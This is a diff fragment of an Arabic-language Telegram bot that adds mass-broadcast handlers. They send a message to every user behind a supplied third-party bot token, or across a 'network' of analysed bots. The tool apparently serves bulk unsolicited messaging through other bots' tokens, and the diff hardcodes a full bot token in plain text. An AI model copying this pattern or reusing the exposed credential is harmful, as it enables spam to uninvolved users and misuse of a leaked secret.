+	            if current_state.get('stop_requested'):
+	                return False
+	                
+	            current_time = time.time()
+	            current_percent = (current / total) * 100 if total > 0 else 0
+	            
+	            if (current_time - last_update_time >= 5 or 
+	                abs(current_percent - last_percent) >= 1 or 
+	                current == total):
+	                
+	                last_update_time = current_time
+	                last_percent = current_percent
+	                new_text = f"📤 جاري ارسال النص: {current}/{total} ({current_percent:.1f}%)"
+	                
+	                # ✅ تحديث رسالة التقدم في قاعدة البيانات
+	                current_state['progress_message']['text'] = new_text
+	                await set_user_state(user_id, current_state)
+	                
+	                await safe_edit_message(progress_msg, new_text, stop_button)
+	            return True
+	        
+	        try:
+	            success, failed = await broadcast_message(
+	                user_state['token'],
+	                users,
+	                broadcast_text,
+	                update_broadcast_progress,
+	                None  # ✅ لا نستخدم stop_events anymore
+	            )
+	            
+	            # ✅ تنظيف حالة العملية من قاعدة البيانات
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            if 'broadcast_data' in user_state:
+	                del user_state['broadcast_data']
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit(f"🎉 خلصنا يا يقلبي و عملت اذاعه!\n✅ نجحنا في ارسال {success} رسالة\n❌ فشلنا في ارسال {failed} رسالة")
+	            
+	        except Exception as e:
+	            # ✅ تنظيف حالة العملية في حالة الخطأ
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            if 'broadcast_data' in user_state:
+	                del user_state['broadcast_data']
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit(f"❌ حصل خطأ في الإذاعة: {str(e)}")
+	    
+	    elif user_state['step'] == 'waiting_token_broadcast_message':
+	        broadcast_text = text
+	        token = user_state['current_broadcast_token']
+	        
+	        try:
+	            users = await extract_users_from_bot(token, user_id)
+	            total_users = len(users)
+	            
+	            # ✅ استخدام قاعدة البيانات بدل stop_events[user_id]
+	            user_state['operation_in_progress'] = True
+	            user_state['stop_requested'] = False
+	            user_state['broadcast_data'] = {
+	                'text': broadcast_text,
+	                'users': users,
+	                'status': 'starting',
+	                'total_users': total_users,
+	                'token': token
+	            }
+	            await set_user_state(user_id, user_state)
+	            
+	            stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	            
+	            progress_msg = await event.respond(f"🚀 بدء ارسال الرسائل من البوت الثانوي إلى {total_users} مستخدم...", buttons=stop_button)
+	            
+	            # ✅ حفظ رسالة التقدم في قاعدة البيانات
+	            user_state['progress_message'] = {
+	                'id': progress_msg.id,
+	                'chat_id': progress_msg.chat_id,
+	                'text': f"🚀 بدء ارسال الرسائل من البوت الثانوي إلى {total_users} مستخدم..."
+	            }
+	            await set_user_state(user_id, user_state)
+	            
+	            last_update_time = 0
+	            last_percent = -1
+	            
+	            async def update_token_broadcast_progress(current, total):
+	                nonlocal last_update_time, last_percent
+	                
+	                # ✅ التحقق من الإيقاف من قاعدة البيانات
+	                current_state = await get_user_state(user_id)
+	                if current_state.get('stop_requested'):
+	                    return False
+	                    
+	                current_time = time.time()
+	                current_percent = (current / total) * 100 if total > 0 else 0
+	                
+	                if (current_time - last_update_time >= 5 or 
+	                    abs(current_percent - last_percent) >= 1 or 
+	                    current == total):
+	                    
+	                    last_update_time = current_time
+	                    last_percent = current_percent
+	                    new_text = f"📤 جاري ارسال النص: {current}/{total} ({current_percent:.1f}%)"
+	                    
+	                    # ✅ تحديث رسالة التقدم في قاعدة البيانات
+	                    current_state['progress_message']['text'] = new_text
+	                    await set_user_state(user_id, current_state)
+	                    
+	                    await safe_edit_message(progress_msg, new_text, stop_button)
+	                return True
+	            
+	            success, failed = await broadcast_message(
+	                token,
+	                users,
+	                broadcast_text,
+	                update_token_broadcast_progress,
+	                None  # ✅ لا نستخدم stop_events anymore
+	            )
+	            
+	            # ✅ تنظيف حالة العملية من قاعدة البيانات
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            if 'broadcast_data' in user_state:
+	                del user_state['broadcast_data']
+	            if 'current_broadcast_token' in user_state:
+	                del user_state['current_broadcast_token']
+	            user_state['step'] = 'analyzed'
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit(f"🎉 خلصنا يا يقلبي!\n✅ نجحنا في ارسال {success} رسالة\n❌ فشلنا في ارسال {failed} رسالة")
+	            
+	        except Exception as e:
+	            # ✅ تنظيف حالة العملية في حالة الخطأ
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            if 'broadcast_data' in user_state:
+	                del user_state['broadcast_data']
+	            if 'current_broadcast_token' in user_state:
+	                del user_state['current_broadcast_token']
+	            await set_user_state(user_id, user_state)
+	            
+	            await event.respond(f"❌ حصل خطأ في الإذاعة: {str(e)}")
+	    
+	    elif user_state['step'] == 'waiting_network_broadcast_message':
+	        broadcast_text = text
+	        
+	        network_analysis_data = await get_network_analysis(user_id)
+	        if not network_analysis_data:
+	            await event.respond("❌ ما فيش بيانات التحليل الشبكي. جرب تاني")
+	            return
+	        
+	        all_bots = network_analysis_data['all_bots']
+	        
+	        # ✅ استخدام قاعدة البيانات بدل stop_events[user_id]
+	        user_state['operation_in_progress'] = True
+	        user_state['stop_requested'] = False
+	        user_state['broadcast_data'] = {
+	            'text': broadcast_text,
+	            'bots': len(all_bots),
+	            'status': 'starting',
+	            'type': 'network'
+	        }
+	        await set_user_state(user_id, user_state)
+	        
+	        stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	        
+	        progress_msg = await event.respond(f"🚀 بدء الإذاعة الشبكية إلى {len(all_bots)} بوت...", buttons=stop_button)
+	        
+	        # ✅ حفظ رسالة التقدم في قاعدة البيانات
+	        user_state['progress_message'] = {
+	            'id': progress_msg.id,
+	            'chat_id': progress_msg.chat_id,
+	            'text': f"🚀 بدء الإذاعة الشبكية إلى {len(all_bots)} بوت..."
+	        }
+	        await set_user_state(user_id, user_state)
+	        
+	        last_update_time = 0
+	        last_percent = -1
+	        last_success = -1
+	        last_failed = -1
+	        
+	        async def update_network_broadcast_progress(current, total, success_count, failed_count):
+	            nonlocal last_update_time, last_percent, last_success, last_failed
+	            
+	            # ✅ التحقق من الإيقاف من قاعدة البيانات
+	            current_state = await get_user_state(user_id)
+	            if current_state.get('stop_requested'):
+	                return False
+	                
+	            current_time = time.time()
+	            current_percent = (current / total) * 100 if total > 0 else 0
+	            
+	            if (current_time - last_update_time >= 5 or 
+	                abs(current_percent - last_percent) >= 1 or 
+	                success_count != last_success or 
+	                failed_count != last_failed or
+	                current == total):
+	                
+	                last_update_time = current_time
+	                last_percent = current_percent
+	                last_success = success_count
+	                last_failed = failed_count
+	                
+	                new_text = (
+	                    f"📤 الإذاعة الشبكية: {current}/{total} ({current_percent:.1f}%)\n"
+	                    f"✅ نجح: {success_count} | ❌ فشل: {failed_count}"
+	                )
+	                
+	                # ✅ تحديث رسالة التقدم في قاعدة البيانات
+	                current_state['progress_message']['text'] = new_text
+	                await set_user_state(user_id, current_state)
+	                
+	                await safe_edit_message(progress_msg, new_text, stop_button)
+	            return True
+	        
+	        try:
+	            total_success, total_failed = await network_broadcast(
+	                all_bots,
+	                broadcast_text,
+	                update_network_broadcast_progress,
+	                None  # ✅ لا نستخدم stop_events anymore
+	            )
+	            
+	            # ✅ تنظيف حالة العملية من قاعدة البيانات
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            if 'broadcast_data' in user_state:
+	                del user_state['broadcast_data']
+	            user_state['step'] = 'analyzed'
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit(
+	                f"🎉 خلصنا يا يقلبي من الإذاعة الشبكية!\n"
+	                f"✅ إجمالي النجاح: {total_success} رسالة\n"
+	                f"❌ إجمالي الفشل: {total_failed} رسالة\n"
+	                f"📊 عبر {len(all_bots)} بوت"
+	            )
+	            
+	        except Exception as e:
+	            # ✅ تنظيف حالة العملية في حالة الخطأ
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            if 'broadcast_data' in user_state:
+	                del user_state['broadcast_data']
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit(f"❌ حصل خطأ في الإذاعة الشبكية: {str(e)}")
     
     print("Starting bot...")
     await bot.start(bot_token='8242278557:AAHhKIbCQNtt5V3kPxLc7UgCzsCIa40GGXo')
@@ -3239,3 +3741,6 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
+    
+    
+    
